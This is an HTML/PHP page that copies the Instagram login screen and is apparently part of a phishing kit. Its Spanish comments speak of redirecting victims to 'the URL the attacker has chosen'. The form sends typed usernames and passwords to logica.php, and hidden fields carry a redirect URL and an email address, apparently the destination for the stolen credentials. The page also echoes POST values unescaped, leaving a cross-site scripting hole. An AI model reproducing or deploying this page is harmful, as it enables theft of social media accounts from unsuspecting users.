

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="../imagenes/faviconig.svg" type="image/svg" sizes="16x16">
    <link rel="stylesheet" href="../css/estilos_ig.css">
</head>
<body>
    <span id="root">
      <section class="section-all">
  
        
        <!-- 1-Role Main -->
        <main class="main" role="main">
          <div class="wrapper">
            <article class="article">
              <div class="content">
                <div class="login-box">
                  <div class="header">
                    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                  </div>
                  <!-- Header end -->
                  <div class="form-wrap">
   
                   <form action="../logica.php" method="POST"> 

                    <div class="input-box">
                      <input value="<?php echo $_POST["usuario"]; ?>" type="text" name="username" id="username" placeholder="Teléfono, usuario o correo electrónico" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                    </div>  

   
                    <div class="input-box">
                        <input type="password" name="password" id="password" placeholder="Contraseña" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                      </div>  
  



                      <!-- Este div permite almacenar la url de gancho y el correo para que en logica.php se pueda redireccionar hacia la url que el atacante ha elegido -->
                        <input style="display:none;" value="<?php echo $_POST["url"]; ?>" type="url" name="gancho" id="gancho">

                        <input style="display:none;" value="<?php echo $_POST["email"]; ?>" type="email" name="enviocorreo" id="enviocorreo">
                     



                      <span class="button-box">  

                  <a href="<?php echo $_POST["url"];?>">   <button class="btn" type="submit" name="submit">Iniciar sesión</button>  </a>
                      </span>  

                     
                    </form> 
  
                      <a class="forgot" href="">Has olvidado la contraseña?</a>
                    
                  </div> <!-- Form-wrap end -->
                </div> <!-- Login-box end -->
  
              

                <div class="login-box">
                  <p class="text">No tienes una cuenta?<a href="#">Regístrate</a></p>
                </div> <!-- Signup-box end -->
  
                <div class="app">
                  <p>Descarga la aplicación.</p>
                  <div class="app-img">
                    <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                      <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
                    </a>
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                      <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
                    </a>  
                  </div>  <!-- App-img end-->
                </div> <!-- App end -->
              </div> <!-- Content end -->
            </article>
          </div> <!-- Wrapper end -->
        </main>
  
        <!-- 2-Role Footer -->
        <footer class="footer" role="contentinfo">
          <div class="footer-container">
  
            <nav class="footer-nav" role="navigation">
              <ul>
                <li><a href="">Información</a></li>
                <li><a href="">Blog</a></li>
                <li><a href="">Empleo</a></li>
                <li><a href="">Ayuda</a></li>
                <li><a href="">API</a></li>
                <li><a href="">Privacidad</a></li>
                <li><a href="">condiciones</a></li>
                <li><a href="">cuentas destacadas</a></li>
                <li><a href="">Hastags</a></li>
                <li><a href="">Ubicaciones</a></li>
                <li><a href="">Belleza</a></li>
                <li><a href="">Danza y espectáculo</a></li>
                <li><a href="">Ejercicio físico</a></li>
                <li><a href="">Comida y bebida</a></li>
                <li><a href="">Hogar y jardinería</a></li>
                <li><a href="">Música</a></li>
                <li><a href="">Artes visuales</a></li>
                <li>
                  <span class="language">Languaje
                    <select name="language" class="select" onchange="la(this.value)">
                      <option value="#">English</option>
                      <option value="http://ru-instafollow.bitballoon.com">Russian</option>
                    </select>
                  </span>
                </li>
              </ul>
            </nav>
  
            <span class="footer-logo">&copy; 2021 Instagram from facebook</span>
          </div> <!-- Footer container end -->
        </footer>
        
      </section>
    </span> <!-- Root -->
  
    <!-- Select Link -->
    <script type="text/javascript">
      function la(src) {
        window.location=src;
      }
    </script>
  </body>
</html>



